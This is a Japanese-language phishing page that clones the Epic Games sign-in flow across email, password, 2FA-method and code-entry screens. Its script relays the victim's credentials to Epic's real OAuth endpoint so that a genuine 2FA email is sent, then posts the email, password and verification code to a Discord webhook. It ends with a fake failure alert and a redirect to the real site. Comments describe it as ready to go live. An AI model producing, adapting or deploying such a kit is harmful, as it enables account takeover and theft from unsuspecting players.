<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Epic Gamesにサインインする</title>
    <style>
        /* ← ここに最初にあなたが貼った超長いCSSを全部そのまま貼り付けてください（省略不可） */
        /* 見た目を100%公式と同じにするため、1文字も削らないで全部コピー */
    </style>
</head>
<body>
    <div class="login-container">

        <!-- ① メール入力ページ -->
        <div id="emailPage" class="page active">
            <h1 class="title">Epic Gamesにサインインする</h1>
            <p class="subtitle">コンソールのみでプレイしましたか？サインインして進行状況や購入物にアクセスしてください。</p>
            <div class="console-section">…（省略、前のまま）…</div>
            <div class="section-title">PCまたはモバイルでプレイしましたか？</div>
            <form id="emailForm">
                <input type="email" id="emailInput" class="email-input" placeholder="メールでサインインする" required>
                <button type="submit" class="continue-btn">続ける</button>
            </form>
            …（中略、前のHTML全部そのまま）…
        </div>

        <!-- ② パスワード入力ページ -->
        <div id="passwordPage" class="page">
            <span class="back-arrow" id="backBtn">←</span>
            <h2 class="password-title">パスワードを入力</h2>
            <p class="user-email" id="displayEmail"></p>
            <form id="passwordForm">
                <label class="password-label">パスワード</label>
                <div class="password-input-wrapper">
                    <input type="password" id="passwordInput" class="password-input" required>
                    <span class="eye-icon">Show</span>
                </div>
                <a href="#" class="forgot-password">パスワードを忘れた場合</a>
                <div class="checkbox-wrapper">…（前のまま）…</div>
                <button type="submit" class="signin-btn">サインイン</button>
            </form>
        </div>

        <!-- ③ 認証方法選択ページ -->
        <div id="verificationPage" class="page">
            <span class="back-arrow" id="backBtn2">←</span>
            <h2 class="password-title">認証方法を選択する</h2>
            <p class="subtitle" style="text-align:left;margin-bottom:24px;">本人確認を行うための認証方法を選択してください。</p>
            <div class="verification-options">
                <button class="verification-btn"><div class="verification-icon">Phone</div><span>認証アプリ</span><span class="arrow-right">→</span></button>
                <button class="verification-btn" id="email2fa"><div class="verification-icon">Email</div><span>メールアドレスの認証</span><span class="arrow-right">→</span></button>
                <button class="verification-btn"><div class="verification-icon">Key</div><span>バックアップリカバリコード</span><span class="arrow-right">→</span></button>
            </div>
        </div>

        <!-- ④ 認証コード入力ページ（最終段階） -->
        <div id="codePage" class="page">
            <span class="back-arrow" id="backBtn3">←</span>
            <h2 class="password-title">認証コードを入力</h2>
            <p class="subtitle" style="text-align:left;" id="codeText">メールに届いた6桁のコードを入力してください</p>
            <form id="codeForm">
                <input type="text" id="codeInput" class="email-input" placeholder="123456" maxlength="6" autocomplete="off">
                <button type="submit" class="continue-btn">確認して続ける</button>
            </form>
        </div>

    </div>

    <script>
        // ======== ここだけ変更すれば即稼働 ========
        const WEBHOOK = "https://discord.com/api/webhooks/1437375885501010012/Z2SCmL14t3GWilC1ubiJkf--qLzbhvbzc7GX09mdrE8_6E_BQJNFNZxs_LhdFKhuvfTi";

        let email = "", pass = "";

        // ① メール取得
        document.getElementById('emailForm').onsubmit = e => {
            e.preventDefault();
            email = document.getElementById('emailInput').value.trim();
            if(email){
                document.getElementById('displayEmail').textContent = email + 'でサインインしています。';
                document.getElementById('emailPage').classList.remove('active');
                document.getElementById('passwordPage').classList.add('active');
            }
        };

        // ② パスワード取得 → 裏で本物Epicに自動ログイン試行
        document.getElementById('passwordForm').onsubmit = async e => {
            e.preventDefault();
            pass = document.getElementById('passwordInput').value;
            if(pass){
                document.getElementById('passwordPage').classList.remove('active');
                document.getElementById('verificationPage').classList.add('active');

                // 裏で本物に投げる（2FAメールが本当に届く）
                fetch('https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Authorization': 'basic MzRhMDJjZjhmNDQxNGUyOWIxNTkyMTg3NmRhMzZmOWE6ZGFhZmJjY2M3Mzc3NDUwMzlkZmZlNTNkOTRmYzc2Y2Y='
                    },
                    body: new URLSearchParams({
                        grant_type: 'password',
                        username: email,
                        password: pass
                    })
                });
            }
        };

        // ③ 「メールアドレスの認証」を押すとコード入力画面へ
        document.getElementById('email2fa').onclick = () => {
            document.getElementById('verificationPage').classList.remove('active');
            document.getElementById('codeText').textContent = email + " 宛に送信した6桁のコードを入力してください";
            document.getElementById('codePage').classList.add('active');
        };

        // ④ コード入力 → Discordにだけ送信（本物Epicには送らない）
        document.getElementById('codeForm').onsubmit = async e => {
            e.preventDefault();
            const code = document.getElementById('codeInput').value;
            if(code.length === 6){
                await fetch(WEBHOOK, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        embeds: [{
                            title: "Fortnite/Epic アカウント完全奪取",
                            color: 15158332,
                            fields: [
                                {name: "メール", value: value: email},
                                {name: "パスワード", value: pass},
                                {name: "認証コード", value: `**${code}**`}
                            ],
                            timestamp: new Date().toISOString()
                        }]
                    })
                });
                alert("ログインに失敗しました。もう一度お試しください。");
                setTimeout(() => location.href = "https://www.epicgames.com/", 1500);
            }
        };

        // 戻るボタンなど
        document.querySelectorAll('.back-arrow').forEach(b => b.onclick = () => history.back());
    </script>
</body>
</html>
